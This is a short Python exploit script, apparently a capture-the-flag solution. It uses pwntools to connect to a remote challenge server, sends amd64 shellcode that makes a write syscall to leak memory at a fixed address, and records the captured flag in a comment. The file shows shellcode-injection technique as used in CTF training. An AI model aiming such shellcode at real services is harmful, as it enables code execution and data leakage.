import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

### ------------------ EXPLOIT ------------------ ###

context.arch = 'amd64'

r = remote('54.85.45.101', 8005)

pay = asm("""
    mov rdi, 1
    mov rsi, 0x4040a0
    mov rdx, 100
    mov rax, SYS_write
    syscall
""")

r.sendline(pay)
r.interactive()

# flag{kinda_like_orw_but_only_ws}